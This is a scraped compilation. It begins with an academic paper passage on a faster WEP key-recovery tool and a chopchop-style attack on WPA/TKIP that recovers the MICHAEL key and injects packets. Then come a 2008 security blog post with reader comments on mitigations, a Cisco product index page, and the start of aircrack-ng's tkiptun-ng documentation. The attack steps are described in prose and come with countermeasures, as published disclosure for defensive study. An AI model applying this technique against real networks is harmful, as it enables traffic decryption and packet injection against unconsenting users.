needs the keystream bytes X[15] to X[30], which can sometimes be recovered too.

Using all these ideas, we modiﬁed an implementation of the PTW attack1 resulting

1deleted obvious reference for blind reviewing, the ﬁnal paper will contain a reference to this imple-

mentation

8

 0 0.1 0.2 0.3 0.4 0.5 0.6 0.7 0.8 0.9 1 0 0.5 1 1.5 2 2.5 3 3.5 4 4.5 5 5.5 6probability of successnumber of sessions collected / 10,000Random IV generationCounter mode IV generationin a new WEP cracking tool, which clearly needs fewer packets than previous imple-
mentations of the PTW attack. We decided to use the same key ranking strategy as
used for the original PTW attack. We limited the number of keys the implementation
tests before failing to 220. The same limit has been used by previous publications
about WEP attacks, so that it should be easier to compare our attack to previous
attacks.

Figure 1 shows the success rate of our implementation. For a 50% success rate, the
attack only needs about 24,200 packets, compared to 32,700 for the VX attack[16] and
35,000 to 40,000 for various implementations of the PTW attack [15, 14].

5 Breaking WPA

Our second contribution is an attack on WPA[2]. WPA standardizes two modes how
payload can be protected during transmission, Temporal Key Integrity Protocol (TKIP)
and (AES-)CCMP. For this paper, we will concentrate on TKIP. TKIP is a slightly
modiﬁed version of WEP. TKIP implements a more sophisticated key mixing function
for mixing a session key with an initialization vector for each packet. This prevents all
currently known related key attacks because every byte of the per packet key depends
on every byte of the session key and the initialization vector. Additionally, a 64
bit Message Integrity Check (MIC) named MICHAEL[2] is included in every packet
to prevent attacks on the weak CRC32 integrity protection mechanism known from
WEP. To prevent simple replay attacks, a sequence counter (TSC) is used which allows
packets only to arrive in order at the receiver.

TKIP was designed so that legacy hardware only supporting WEP should be ﬁrmware
or driver upgradeable to TKIP. Therefore, the RC4 stream cipher is still used and the
ICV is still included in every packet.

We will now show that it is still possible to decrypt traﬃc in a chopchop like manner
and to send packets with a custom content: Assume that the following conditions are
met: The network being attacked is using TKIP for client to access point communi-
cation. The IPv4 protocol is used with an IP range where most bytes of the addresses
are known to the attacker (for example 192.168.0.X). A long re-keying interval is used
for TKIP, for example 3600 seconds. The network supports the IEEE 802.11e Quality
of Service features[2] which allow 8 diﬀerent channels (named TID - traﬃc identiﬁer)
for diﬀerent data ﬂows and a station is currently connected to the network.

These assumptions are quite realistic for most networks currently deployed in the
wild. To attack such a network, an attacker ﬁrst captures traﬃc, until he has found an
encrypted ARP request[11] or response. Such packets can easily be detected because
of the characteristic length. Additionally, the source and destination ethernet address
is not protected by WEP and TKIP and requests are always sent to the broadcast
address of the network. Most of the plaintext of this packet is known to the attacker,
except the last byte of the source and destination IP addresses, the 8 byte MICHAEL
MIC and the 4 byte ICV checksum. MIC and ICV form the last 12 bytes of the
plaintext.

An attacker can now launch a modiﬁed chochop attack as against a WEP network
to decrypt the unknown plaintext bytes. TKIP mainly contains two countermeasures
against chopchop like attacks:

9

• If a packet with an incorrect ICV value is received by a client, a transmission
error is assumed and the resulting packet is silently discarded. If the ICV value
is correct, but the MIC veriﬁcation fails, an attack is assumed and the access
point is notiﬁed by sending a MIC failure report frame.
If more than 2 MIC
veriﬁcation failures occur in less than 60 seconds, the communication is shut
down, and all keys are renegotiated after a 60 second penalty period.

• When a packet has been received correctly, the TSC counter for the channel
it was received on is updated. If a packet with a lower value than the current
counter is received (the packet is received out of order), the packet is discarded.

Nevertheless, it is still possible to execute a chopchop attack. An attacker needs to
execute the attack on a diﬀerent QoS channel than the packet was originally received
on. Usually, there will be a channel with no or low traﬃc where the TSC counter is
still lower. If the guess for the last byte during the chopchop attack was incorrect, the
packet is still dropped silently. If the guess was correct, a MIC failure report frame
is sent by the client, but the TSC counter is not increased. The attacker needs to
wait for at least 60 seconds after triggering a MIC failure report frame to prevent the
client from engaging countermeasures. Within a little bit more than 12 minutes, the
attacker can decrypt the last 12 bytes of plaintext (MIC and ICV). To determine the
remaining unknown bytes (exact sender and receiver IP addresses), the attacker can
guess the values and verify them against the decrypted ICV.

After the MIC and the plaintext of the packet is known, an attacker can simply re-
verse the MICHAEL algorithm and recover the MIC key used to protect packets being
send from the access point to the client. The MICHAEL algorithm is not designed
to be a one-way function and reversing the algorithm is as eﬃcient as calculating the
algorithm forward.

At this point, the attacker has recovered the MIC key and knows a keystream for
access point to client communication. He is now able to send a custom packet to the
client on every QoS channel, where the TSC counter is still lower than the value used
for the captured packet. In most networks in the wild, all traﬃc is just transmitted
on channel 0, so that the attacker is now able to send 7 custom packets to the client.
After the attack has been successfully executed, an attacker can recover an additional
keystream within 4-5 minutes, because he just needs to decrypt the 4 byte ICV using
chopchop. The ip address bytes can be guessed, the MIC can then be calculated using
the known MIC key and then be veriﬁed against the ICV.

To cause damage, the attacker could for example send messages triggering IDS
systems which work on the IP layer. Alternatively, traﬃc could be rerouted using
fake ARP responses. The attacker could try to establish a bidirectional channel to
the client, if the client is connected to the internet using a ﬁrewall blocking incoming
traﬃc, but allowing outgoing traﬃc. The responses of the client cannot be read over
the air by the attacker, but could be routed back over the internet.

We created a proof of concept implementation of this attack2 to verify that the attack
actually works. We managed to attack hardware from various vendors, conﬁrming that
this attack is really applicable against real world networks.

2deleted obvious reference, the ﬁnal paper will contain a reference to the attack implementation

10

Even if the network does not support the IEEE 802.11e QoS features, the attack still
seems to be possible. Here, the attacker needs to prevent the client from receiving the
data packet he chooses for the chopchop attack, and must disconnect the client from
the access point for the time of the attack, so that the TSC counter is not increased
by the packet or following packets. After the attacker has successfully executed the
chopchop attack, he can send a single data packet to the client. However, we did not
implement this attack mode.

If an attacker would manage to recover a keystream still valid for a QoS channel
and the MIC key for both directions (our attack only recovery a keystream and the
MIC key for access point to client communication), he would be able to use them
to recover additional keystreams and could send a unlimited number of packets with
custom plaintext.

5.1 Countermeasures

To prevent this attack, we suggest using a very short rekeying time, for example 120
seconds or less. In 120 seconds, the attacker can only decrypt parts of the ICV value
at the end of a packet. Alternatively disabling the sending of MIC failure report
frame frames on the clients would also prevent the attack. The best solution would
be disabling TKIP and using a CCMP only network.

6 Conclusion

WEP is known to be insecure since 2001, however we think that key recovery attacks
against WEP are still of interest. On the one hand, WEP is still used in the wild
and on the other, some companies are selling hardware using modiﬁed versions of the
WEP protocol, they claim to be secure. Secondly, the TKIP protocol used by WPA
is not much diﬀerent from WEP, so that attacks on WEP can aﬀect the security of
networks using TKIP, as seen in the paper.

Our attack on TKIP in Section 5 shows that even WPA with a strong password is
not 100% secure and can be attacked in a real world scenario. Although this attack
is not a complete key recovery attack, we suggest that vendors should implement
countermeasures against this attack. Because the problem can be ﬁxed in a high level
part of the protocol, we think that updates can easily be developed and deployed with
new drivers.

References

[1] Andrea Bittau, Mark Handley, and Joshua Lackey. The ﬁnal nail in WEP’s coﬃn.
In IEEE Symposium on Security and Privacy, pages 386–400. IEEE Computer
Society, 2006.

[2] IEEE-SA Standards Board. Wireless LAN Medium Access Control (MAC) and
Physical Layer (PHY) Speciﬁcations. Communications Magazine, IEEE, 2007.

[3] Raﬁk Chaabouni. Break wep faster with statistical analysis. Technical report,

EPFL, LASEC, June 2006.

11

[4] Scott R. Fluhrer, Itsik Mantin, and Adi Shamir. Weaknesses in the key scheduling
algorithm of RC4. In Serge Vaudenay and Amr M. Youssef, editors, Selected Areas
in Cryptography 2001, volume 2259 of Lecture Notes in Computer Science, pages
1–24. Springer, 2001.

[5] David Hulton. Practical exploitation of RC4 weakness in WEP environments,

2002. presented at HiverCon 2002.

[6] Robert J. Jenkins. Isaac and rc4. [http://burtleburtle.net/bob/rand/isaac.

html, 1996.

[7] A. Klein. Attacks on the RC4 stream cipher. Designs, Codes and Cryptography,

48(3):269–286, 2008.

[8] KoreK. chopchop (experimental WEP attacks). http://www.netstumbler.org/

showthread.php?t=12489, 2004.

[9] KoreK. Next generation of WEP attacks?

http://www.netstumbler.org/

showpost.php?p=93942&postcount=35, 2004.

[10] Yuko Ozasa, Yoshiaki Fujikawa, Toshihiro Ohigashi, Hidenori Kuwakado, and
Masakatu Morii. A study on the Tews, Weinmann, Pyshkin attack against WEP.
In IEICE Tech. Rep., volume 107 of ISEC2007-47, pages 17–21, Hokkaido, July
2007. Thu, Jul 19, 2007 - Fri, Jul 20 : Future University-Hakodate (ISEC, SITE,
IPSJ-CSEC).

[11] D. C. Plummer. RFC 826: Ethernet Address Resolution Protocol: Or convert-
ing network protocol addresses to 48.bit Ethernet address for transmission on
Ethernet hardware, November 1982.

[12] David Sterndark.

Rc4 algorithm revealed.
<sternCvKL4B.Hyy@netcom.com>, Sep 1994.

Usenet posting, Message-ID:

[13] Adam Stubbleﬁeld, John Ioannidis, and Aviel D. Rubin. A key recovery attack
on the 802.11b wired equivalent privacy protocol (WEP). ACM Transactions on
Information and System Security, 7(2):319–332, May 2004.

[14] Erik Tews. Attacks on the wep protocol. Cryptology ePrint Archive, Report

2007/471, 2007. http://eprint.iacr.org/.

[15] Erik Tews, Ralf-Philipp Weinmann, and Andrei Pyshkin. Breaking 104 bit wep
in less than 60 seconds. In Sehun Kim, Moti Yung, and Hyung-Woo Lee, edi-
tors, WISA, volume 4867 of Lecture Notes in Computer Science, pages 188–202.
Springer, 2007.

[16] Serge Vaudenay and Martin Vuagnoux. Passive-only key recovery attacks on
RC4. In Selected Areas in Cryptography 2007, Lecture Notes in Computer Science.
Springer, 2007.

12



=== Content from radajo.blogspot.com_293d7661_20250125_015942.html ===


![](//photos1.blogger.com/blogger/1580/2175/320/RaDaJo.0.png)

![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiK0J3rEFPL6B-c0OKOWblJQHA_SxFqgqg7HDRbE2-7wRC88Zlrm6aetLHuWQwURQZQAxJMKOljFKmM2CatNDGFIikBxSDN5Wo0vT9oGcPxprX1MxEGQw_2DdX7Jv0RIBc_eX_F/s400/GSE.1.jpg)

# [RaDaJo (RAul, DAvid and JOrge) Security Blog](http://radajo.blogspot.com/)

Turning Information Security Inside-Out

## November 08, 2008

### WPA/TKIP ChopChop Attack

Probably at this point you have heard that "WPA has been cracked" all over the Internet and the Blogosphere. As the specific details will be fully disclosed on [PacSec 2008](http://pacsec.jp/) next week, and in an upcoming [whitepaper](http://dl.aircrack-ng.org/breakingwepandwpa.pdf) on the [aircrack-ng](http://www.aircrack-ng.org/) website ([check it](http://www.aircrack-ng.org/doku.php?id=links) during the weekend or early next week), I considered relevant to provide technical details (summarizing facts) about what's going on and clarify some of the FUD out there.

*posted by Raul Siles at [1:21 AM](http://radajo.blogspot.com/2008/11/wpatkip-chopchop-attack.html "permanent

link")*
[![](https://resources.blogblog.com/img/icon18_email.gif)](https://www.blogger.com/email-post/31571948/6839936137943700003 "Email Post")[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=31571948&postID=6839936137943700003&from=pencil "Edit Post")

#### 10 Comments:

![Blogger](https://resources.blogblog.com/img/b16-rounded.gif) [Unknown](https://www.blogger.com/profile/01296093322946805050) said...

As I read it, your article suggest the problem is primarily with TKIP. Is WPA with AES still safe?

wmrobins

[5:25 AM](#1032516982497072215 "comment

permalink")

![Blogger](https://resources.blogblog.com/img/b16-rounded.gif) [Raul Siles](https://www.blogger.com/profile/15605985650569727525) said...

Hello Bill,
YES, at this point AES is safe, as the new attack exploits a vulnerability in TKIP, specifically in its message integrity check (MIC) algorithm, called Michael, and the countermeasures TKIP implements to protect it.

AES does not uses Michael as its MIC, but an AES crypto checksum instead (AES can be used for encryption AND hashing), and therefore, does not implement the countermeasures either.

[11:30 AM](#8472412166353673223 "comment

permalink")

![Anonymous](https://resources.blogblog.com/img/anon16-rounded.gif) Anonymous said...

already on http://www.aircrack-ng.org/doku.php?id=links the article can be read.

[8:45 PM](#5777848347438532787 "comment

permalink")

![Blogger](https://resources.blogblog.com/img/b16-rounded.gif) [Unknown](https://www.blogger.com/profile/17840894711931957644) said...

After a (short) keystream has been recovered, is it possible to use the Arbaugh inductive attack (inverse chopchop) to expand the keystream? It'd be an extremely slow expansion though, 1 byte per >60 seconds.

[3:59 AM](#7116184680842802795 "comment

permalink")

![Blogger](https://resources.blogblog.com/img/b16-rounded.gif) [Raul Siles](https://www.blogger.com/profile/15605985650569727525) said...

Zheng, potentially, expanding the attack as you suggest (as we saw in WEP long time ago) might be an option.

It has not been demonstrated yet, but definitely, more enhancements and improvements to this attacks are coming on the next weeks and months. In fact, the authors are already working on new extensions.

[9:57 AM](#4155499986658691527 "comment

permalink")

![Anonymous](https://resources.blogblog.com/img/anon16-rounded.gif) Anonymous said...

You forget one important and efective countermeasure against WPA(2)+TKIP attack...VPNs. For example, OpenVPN 2.1 "hides" all vulnerable arp and dns packet in udp1194 traffic and and attack stops...attacker discover short rc4 keystream, but he nothing to do with this keystream, arp,dns or icmp injection doesn't work due VPN encryption in higher osi layer.

[8:09 AM](#4173926208375557262 "comment

permalink")

![Blogger](https://resources.blogblog.com/img/b16-rounded.gif) [Raul Siles](https://www.blogger.com/profile/15605985650569727525) said...

Ivars, I agree with you that VPNs help to mitigate this type of threats that attack the WiFi encryption mechanisms.

However, you still must consider some risks of using VPNs over WiFi, such as for example the period till the VPN is established. While the VPN is not active (and unfortunately there are at least a few seconds since your wireless card is active and your VPN tunnel is on), you are exposed to, let's say, ARP spoofing attacks.

[12:31 PM](#7871818679700039131 "comment

permalink")

![Anonymous](https://resources.blogblog.com/img/anon16-rounded.gif) Anonymous said...

What about using the cipher: AES CCMP + TKIP on WPA. Should I remove the TKIP and just keep AES CCMP.

[11:02 PM](#2890834738537344832 "comment

permalink")

![Blogger](https://resources.blogblog.com/img/b16-rounded.gif) [Raul Siles](https://www.blogger.com/profile/15605985650569727525) said...

Hello,
When vendors refer to AES CCMP + TKIP on WPA it typically means the setup supports both protocols, AES and TKIP, and therefore you can be vulnerable when TKIP is used.

I recommend you to leave AES only, or much better, use WPA2/AES instead.

[12:04 AM](#6345632269598204332 "comment

permalink")

![Anonymous](https://resources.blogblog.com/img/anon16-rounded.gif) Ramkumar said...

Awesome post !!!

[11:47 AM](#8627684814540614726 "comment

permalink")

[Post a Comment](https://www.blogger.com/comment/fullpage/post/31571948/6839936137943700003)

[<< Home](http://radajo.blogspot.com/)

## **Recent Posts:**

* [Security Book Review: "Google Hacking for Penetrat...](http://radajo.blogspot.com/2008/11/security-book-review-google-hacking-for.html)
* [nc2 : Netcat without a couple of annoyances](http://radajo.blogspot.com/2008/09/nc2-netcat-without-couple-of-annoyances.html)
* [Security Book Review: "Applied Security Visualizat...](http://radajo.blogspot.com/2008/09/security-book-review-applied-security.html)
* [The Evidence was in your Monthly Cell Phone Bill!....](http://radajo.blogspot.com/2008/09/evidence-was-in-your-monthly-cell-phone.html)
* [Autoimmunity disorder in Wireless LANs](http://radajo.blogspot.com/2008/08/autoimmunity-disorder-in-wireless-lans.html)
* [WebDAV with SSL on VISTA](http://radajo.blogspot.com/2008/08/webdav-with-ssl-on-vista.html)
* [NETinVM: A whole network in a single virtual machine](http://radajo.blogspot.com/2008/07/netinvm-whole-network-in-single-virtual.html)
* [Security Book Review: "Penetration Tester's - Open...](http://radajo.blogspot.com/2008/07/security-book-review-penetration.html)
* [Security Book Review; "Virtual Honeypots: From Bot...](http://radajo.blogspot.com/2008/07/security-book-review-virtual-honeypots.html)
* [Security Book Review: "LAN Switch Security: What H...](http://radajo.blogspot.com/2008/07/security-book-review-lan-switch.html)

## **Security Links:**

* [Hacking conferences](http://radajo.blogspot.com/2006/08/security-hacking-conferences-feeding.html)
* [Security podcasts](http://radajo.blogspot.com/2006/10/podcasting-radio-killed-reading-star.html)

---

Copyright © 2006 (Designed by Raúl Siles). All rights reserved.



=== Content from www.cisco.com_05ad9d2f_20250125_015944.html ===


* [Skip to content](#fw-content)
* Skip to search
* [Skip to footer](#fw-footer-v2)

* [Cisco.com Worldwide](https://www.cisco.com/site/us/en/index.html)
* [Products and Services](/c/en/us/products/index.html)
* [Solutions](https://www.cisco.com/site/us/en/solutions/index.html)
* [Support](/c/en/us/support/index.html)
* [Learn](/c/en/us/training-events.html)
* [Explore Cisco](//www.cisco.com/c/en/us/about/sitemap.html)
* [How to Buy](/c/en/us/buy.html)
* [Partners Home](https://www.cisco.com/site/us/en/partners/index.html?dtid=odicdc001129)
* [Partner Program](https://www.cisco.com/site/us/en/partners/cisco-partner-program/index.html?ccid=cc000864&dtid=odiprc001129)
* [Support](https://www.cisco.com/site/us/en/partners/support-help/index.html)
* [Tools](https://www.cisco.com/site/us/en/partners/tools/index.html?dtid=odiprc001129)
* [Find a Cisco Partner](https://locatr.cloudapps.cisco.com/WWChannels/LOCATR/pf/index.jsp#/)
* [Meet our Partners](https://www.cisco.com/site/us/en/partners/connect-with-a-partner/index.html?ccid=cc000864&dtid=odiprc001129)
* [Become a Cisco Partner](https://www.cisco.com/site/us/en/partners/index.html?dtid=odicdc001129)

# Products, Solutions, and Services

Want some help finding the Cisco products that fit your needs? You're in the right place. If you want troubleshooting help, documentation, other support, or downloads, visit our [technical support area](/c/en/us/support/index.html).

### Contact Cisco

* [Get a call from Sales](https://www.cisco.com/site/us/en/about/contact-cisco/index.html?linkclickid=luh-contactus)
* ##### Call Sales:
* 1-800-553-6387
* US/CAN | 5am-5pm PT
* [Product / Technical Support](//www.cisco.com/c/en/us/support/index.html)
* [Training & Certification](https://www.cisco.com/site/us/en/learn/training-certifications/index.html)

## Products by technology

[![Networking](/c/en/us/products/index/_jcr_content/Grid/category_atl_eced/layout-category-atl/blade/bladeContents/thirds_0/Th-Third-1/tile_2c6e.img.jpg/1671716266119.jpg "Networking")](/site/us/en/products/networking/index.html)

### [Networking](https://www.cisco.com/site/us/en/products/networking/index.html)

* [Switches](https://www.cisco.com/site/us/en/products/networking/switches/index.html)
* [Routers](https://www.cisco.com/site/us/en/products/networking/sdwan-routers/index.html)
* [Wireless](https://www.cisco.com/site/us/en/products/networking/wireless/index.html)
* [Software-defined networking](/c/en/us/solutions/software-defined-networking/overview.html)
* [Cisco Silicon One](/c/en/us/solutions/silicon-one.html)
* [Cloud and network management](/c/en/us/products/cloud-systems-management/index.html)
* [Interfaces and modules](/c/en/us/products/interfaces-modules/index.html)
* [Optical networking](/c/en/us/products/optical-networking/index.html)

* [See all Networking](/site/us/en/products/networking/index.html)

[![Wireless and Mobility](/c/en/us/products/index/_jcr_content/Grid/category_atl_eced/layout-category-atl/blade/bladeContents/thirds_0/Th-Third-2/tile_57b5.img.jpg/1671718447604.jpg "Wireless and Mobility")](/c/en/us/products/wireless/index.html)

### [Wireless and Mobility](https://www.cisco.com/site/us/en/products/networking/wireless/index.html)

* [Access points](https://www.cisco.com/site/us/en/products/networking/wireless/access-points/index.html)
* [Outdoor and industrial access points](/c/en/us/products/wireless/outdoor-wireless/index.html)
* [Controllers](/c/en/us/products/wireless/wireless-lan-controller/index.html)

* [See all Wireless and Mobility](https://www.cisco.com/site/us/en/products/networking/wireless/index.html)

[![Security](/c/en/us/products/index/_jcr_content/Grid/category_atl_eced/layout-category-atl/blade/bladeContents/thirds_0/Th-Third-3/tile_270.img.jpg/1721150027476.jpg "Security")](https://www.cisco.com/site/us/en/products/security/index.html)

### [Security](https://www.cisco.com/site/us/en/products/security/index.html)

* [Secure Firewall](/site/us/en/products/security/firewalls/index.html)
* [Secure Endpoint](/site/us/en/products/security/endpoint-security/secure-endpoint/index.html)
* [Secure Email](https://www.cisco.com/site/us/en/products/security/secure-email/index.html)
* [Secure Access (SSE)](https://www.cisco.com/site/us/en/products/security/secure-access/index.html)
* [Duo](https://duo.com/?utm_source=cisco&utm_medium=referral)
* [Umbrella](https://umbrella.cisco.com/?utm_medium=web-referral&utm_source=cisco)
* [Multicloud Defense](https://www.cisco.com/site/us/en/products/security/multicloud-defense/index.html)
* [XDR](https://www.cisco.com/site/us/en/products/security/xdr/index.html)

* [See all Security](/site/us/en/products/security/index.html)

[![Collaboration](/c/en/us/products/index/_jcr_content/Grid/category_atl_eced/layout-category-atl/blade/bladeContents/thirds/Th-Third-1/tile_242e.img.jpg/1614332999435.jpg "Collaboration")](/c/en/us/solutions/collaboration/index.html)

### [Collaboration](/c/en/us/solutions/collaboration/index.html)

* [Collaboration endpoints](/c/en/us/products/collaboration-endpoints/index.html)
* [Conferencing](/c/en/us/products/conferencing/index.html)
* [Cisco Contact Center](/c/en/us/products/contact-center/index.html)
* [Unified communications](/c/en/us/products/unified-communications/index.html)
* [Experience Management](/c/en/us/solutions/collaboration/experience-management/index.html)

* [See all Collaboration](/c/en/us/solutions/collaboration/index.html)

[![Data Center](/c/en/us/products/index/_jcr_content/Grid/category_atl_eced/layout-category-atl/blade/bladeContents/thirds/Th-Third-2/tile_c570.img.jpg/1731566611241.jpg "Data Center")](/c/en/us/solutions/data-center-virtualization/index.html)

### [Data Center](https://www.cisco.com/site/us/en/products/networking/cloud-networking/index.html)

* [Servers: Cisco Unified Computing System](https://www.cisco.com/site/us/en/products/computing/servers-unified-computing-systems/index.html)
* [Cloud Networking](/site/us/en/products/networking/cloud-networking/index.html)
* [Security](https://www.cisco.com/site/us/en/solutions/security/data-center-security/index.html)
* [Switches](https://www.cisco.com/site/us/en/products/networking/cloud-networking-switches/index.html)
* [Hyperconverged infrastructure](https://www.cisco.com/site/us/en/products/computing/hyperconverged/nutanix/index.html)
* [Storage networking](https://www.cisco.com/site/us/en/products/networking/cloud-networking-switches/storage-area-networking/index.html)

* [See all Data Center](https://www.cisco.com/site/us/en/products/networking/cloud-networking/index.html)

![Analytics](/c/en/us/products/index/_jcr_content/Grid/category_atl_eced/layout-category-atl/blade/bladeContents/thirds/Th-Third-3/tile_2e68.img.jpg/1665457950841.jpg "Analytics")

### Analytics

* [Nexus Dashboard Insights](/c/en/us/products/data-center-analytics/nexus-insights/index.html)
* [Network analytics](/c/en/us/solutions/analytics.html)
* [Cisco Secure Network Analytics (Stealthwatch)](https://www.cisco.com/site/us/en/products/security/security-analytics/secure-network-analytics/index.html)

[![Video](/c/en/us/products/index/_jcr_content/Grid/category_atl_eced/layout-category-atl/blade/bladeContents/thirds_1/Th-Third-1/tile_38f7.img.jpg/1672920281741.jpg "Video")](/c/en/us/products/video/index.html)

### [Video](/c/en/us/products/video/index.html)

* [Video endpoints](/c/en/us/products/collaboration-endpoints/index.html)
* [Cisco Vision](/c/en/us/support/video/stadiumvision-director/model.html)

* [See all Video](/c/en/us/products/video/index.html)

[![Internet of Things](/c/en/us/products/index/_jcr_content/Grid/category_atl_eced/layout-category-atl/blade/bladeContents/thirds_1/Th-Third-2/tile_e94f.img.jpg/1715235647757.jpg "Internet of Things")](/c/en/us/solutions/internet-of-things/overview.html?ccid=cc002470&oid=otrit016342&dtid=odicdc000509)

### [Internet of Things (IoT)](/c/en/us/solutions/internet-of-things/overview.html?ccid=cc002470&oid=otrit016342&dtid=odicdc000509)

* [Industrial Networking](https://www.cisco.com/site/us/en/products/networking/industrial-iot/index.html?ccid=cc002470&oid=powit031137&dtid=odicdc000509)
* [Industrial Routers and Gateways](https://www.cisco.com/site/us/en/products/networking/industrial-routers-gateways/index.html?ccid=cc002425&oid=powit025991&dtid=odicdc000509)
* [Industrial Security](https://www.cisco.com/site/us/en/products/security/industrial-security/index.html?ccid=cc002176&oid=pstit024545&dtid=odicdc000509)
* [Industrial Switching](https://www.cisco.com/site/us/en/products/networking/industrial-switches/index.html?ccid=cc002430&oid=powit024547&dtid=odicdc000509)
* [Industrial Wireless](https://www.cisco.com/site/us/en/products/networking/industrial-wireless/index.html?ccid=cc002272&oid=powit031152&dtid=odicdc000509)
* [Industrial Connectivity Management](/c/en/us/solutions/internet-of-things/iot-management-automation.html?dtid=odicdc000509)
* [Extended Enterprise](/c/en/us/solutions/internet-of-things/extended-enterprise.html?dtid=odicdc000509)
* [Data Management](/c/en/us/solutions/internet-of-things/edge-intelligence.html?ccid=cc002416&oid=powit029901&dtid=odicdc000509)

* [See all industrial IoT](/c/en/us/solutions/internet-of-things/overview.html?ccid=cc002470&oid=otrit016342&dtid=odicdc000509)

[![Software](/c/en/us/products/index/_jcr_content/Grid/category_atl_eced/layout-category-atl/blade/bladeContents/thirds_1/Th-Third-3/tile_81a5.img.jpg/1697552912161.jpg "Software")](/c/en/us/products/software/index.html)

### [Software](/c/en/us/products/software/index.html)

* [Cisco+ (as-a-service)](/c/en/us/products/plus-as-a-service.html)
* [Cisco buying programs](https://www.cisco.com/site/us/en/buy/enterprise-software-buying-program.html)
* [Cisco Nexus Dashboard](https://www.cisco.com/site/us/en/products/networking/cloud-networking/nexus-platform/index.html)
* [Cisco Networking Software](https://www.cisco.com/site/us/en/products/networking/software/index.html)
* [Cisco DNA Software for Wireless](/site/us/en/products/networking/access-software/dna-subscription-wireless/index.html)
* [Cisco DNA Software for Switching](/site/us/en/products/networking/access-software/dna-subscription-switching/index.html)
* [Cisco DNA Software for SD-WAN and Routing](/site/us/en/products/networking/wan-software/dna-subscription-wan/index.html)
* [Cisco Intersight for Compute and Cloud](/site/us/en/products/computing/hybrid-cloud-operations/intersight-platform/index.html)
* [Cisco ONE for Data Center Compute and Cloud](/c/en/us/solutions/data-center-virtualization/one-enterprise-suite/index.html)

* [See all Software](/c/en/us/products/software/index.html)

* [Product index](/c/en/us/products/a-to-z-series-index.html#all)

## Products by business type

[![Service Providers](/c/en/us/products/index/_jcr_content/Grid/category_atl_eced/layout-category-atl/blade_1/bladeContents/tile_e6b.img.jpg/1595021332831.jpg "Service Providers")](/c/en/us/solutions/service-provider/index.html)

### [Service providers](/c/en/us/solutions/service-provider/index.html)

[![Small Business](/c/en/us/products/index/_jcr_content/Grid/category_atl_eced/layout-category-atl/blade_1/bladeContents1/tile_b246.img.jpg/1730174509888.jpg "Small Business")](https://www.cisco.com/site/us/en/solutions/small-business/index.html)

### [Small business](https://www.cisco.com/site/us/en/solutions/small-business/index.html)

[![Midsize](/c/en/us/products/index/_jcr_content/Grid/category_atl_eced/layout-category-atl/blade_1/bladeContents2/tile_9e9b.img.jpg/1595021333521.jpg "Midsize")](/c/en/us/solutions/midsize/overview.html)

### [Midsize business](/c/en/us/solutions/midsize/overview.html)

## Solutions

Cisco can provide your organization with solutions for everything from networking and data center to collaboration and security. Find the options best suited to your business needs.

* [By technology](/c/en/us/solutions/index.html#by-technology)
* [By industry](/c/en/us/solutions/industries.html)

* [See all solutions](https://www.cisco.com/site/us/en/solutions/index.html)

## CX Services

Cisco and our partners can help you transform with less risk and effort while making sure your technology delivers tangible business value.

* [See all services](https://www.cisco.com/site/us/en/services/index.html)

## Design Zone: Cisco design guides by category

[Networking](/c/en/us/solutions/design-zone/networking-design-guides.html)

[Cloud](/c/en/us/solutions/design-zone.html)

[Security](/c/en/us/solutions/enterprise/design-zone-security/index.html)

[Industries](/c/en/us/solutions/design-zone/industries.html)

[Data center](/c/en/us/solutions/design-zone/data-center-design-guides/data-center-design-guides-all.html)

[Collaboration](/c/en/us/solutions/enterprise/design-zone-collaboration/index.html)

* [See all Cisco design guides](/c/en/us/solutions/design-zone.html)

### End-of-sale and end-of-life

* [End-of-sale and end-of-life products](/c/en/us/products/eos-eol-listing.html)
* [End-of-Life Policy](/c/en/us/products/eos-eol-policy.html)

### Tools

* [Cisco Commerce Build & Price](https://apps.cisco.com/Commerce/guest)
* [Cisco Software Central](https://software.cisco.com/download/home)
* [Cisco Feature Navigator](//cfn.cloudapps.cisco.com/ITDIT/CFN/jsp/index.jsp)

* [See all product tools](/c/en/us/support/web/tools-catalog.html)

### Resources

* [Cisco Mobile Apps](/c/en/us/products/mobile-apps-listing.html)
* [Design Zone: Cisco design guides](/c/en/us/solutions/enterprise/design-zone/index.html)
* [Cisco DevNet](https://developer.cisco.com/site/devnet/home/index.gsp)
* [Marketplace Solutions Catalog](https://marketplace.cisco.com/catalog)
* [Product approvals](/c/en/us/products/product-approvals.html)
* [Product identification standard](/c/en/us/products/unique-device-identifier-udi.html)
* [Product warranties](/c/en/us/products/warranty-listing.html)
* [Cisco Security Advisories](https://tools.cisco.com/security/center/publicationListing.x)
* [Security Vulnerability Policy](https://tools.cisco.com/security/center/resources/security_vulnerability_policy.html)
* [Visio stencils](/c/en/us/products/visio-stencil-listing.html)

* [Local Resellers](https://locatr.cloudapps.cisco.com/WWChannels/LOCATR/openBasicSearch.do)
* [Technical Support](/c/en/us/support/index.html)
* [Demos](https://www.cisco.com/site/us/en/products/trials-demos.html)

![](//cisco.112.2o7.net/b/ss/cisco-mobile/5/12345)


=== Content from www.aircrack-ng.org_b24839bb_20250125_015942.html ===


* [skip to content](#dokuwiki__content)

# [Aircrack-ng](/doku.php?id=Main "Home [h]")

### User Tools

* [Log In](/doku.php?id=tkiptun-ng&do=login&sectok= "Log In")

### Site Tools

Search
ToolsShow pagesourceBacklinksMedia ManagerSitemapLog In>

* [Media Manager](/doku.php?id=tkiptun-ng&do=media&ns= "Media Manager")
* [Sitemap](/doku.php?id=tkiptun-ng&do=index "Sitemap [x]")

Trace: • [tkiptun-ng](/doku.php?id=tkiptun-ng "tkiptun-ng")

---

tkiptun-ng

### Table of Contents

* [Tkiptun-ng](#tkiptun-ng)
  + [Description](#description)
  + [General Requirements](#general_requirements)
  + [Specific Requirements](#specific_requirements)
  + [Why?](#why)
  + [Usage](#usage)
  + [Usage Examples](#usage_examples)
  + [Usage Tips](#usage_tips)
  + [Usage Troubleshooting](#usage_troubleshooting)

# Tkiptun-ng

## Description

NOTE: This documentation is still under development. Please check back on a regular basis to obtain the latest updates. If you have any feedback on the documentation, please post your comments to the [Forum](http://forum.aircrack-ng.org "http://forum.aircrack-ng.org").

**IMPORTANT NOTE:** The tkiptun-ng included in v1.0 is not fully working. The final attack phase is not yet implemented. The other portions are working with the ieee80211 drivers for RT73 and RTL8187L chipsets. The madwifi-ng driver is definitely broken and is known to completely fail. tkiptun-ng may work with other drivers but has not been tested so your mileage may vary.

